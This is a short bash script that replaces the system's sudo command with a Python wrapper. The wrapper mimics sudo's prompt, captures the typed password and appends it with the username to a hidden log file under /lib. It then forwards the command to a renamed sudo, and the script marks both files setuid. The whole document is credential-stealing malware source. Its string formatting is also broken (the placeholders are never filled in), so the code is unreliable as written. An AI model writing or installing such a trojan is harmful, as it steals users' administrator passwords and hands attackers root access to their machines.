#!/bin/bash
cat <<EOFA > /usr/bin/sudoB
import os
import subprocess
import sys
import getpass

def main():
    if(len(sys.argv) == 1):
        print("""
        usage: sudo -h | -K | -k | -V
        usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
        usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
        usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
        usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...
        """)
    else:
        user = getpass.getuser()
        
        os.system('stty -echo')
        password = input("[sudo] password for {user}: ")
        os.system("echo \"{user}:{password}\" >> /lib/.syslogbLog")
        os.system('stty echo')
        arguments = ""
        del sys.argv[0]
        for arg in sys.argv:
            arguments = arguments + arg + " "
        os.system("echo {password} | sudoA -S -k {arguments}")
main()
EOFA
cat <<EOFB > /usr/bin/sudo
#!/bin/bash
python3 /usr/bin/sudoB "$@"
EOFB
chmod +s /usr/bin/sudo
chmod +x /usr/bin/sudo
chmod +s /usr/bin/sudoB
chmod +x /usr/bin/sudoB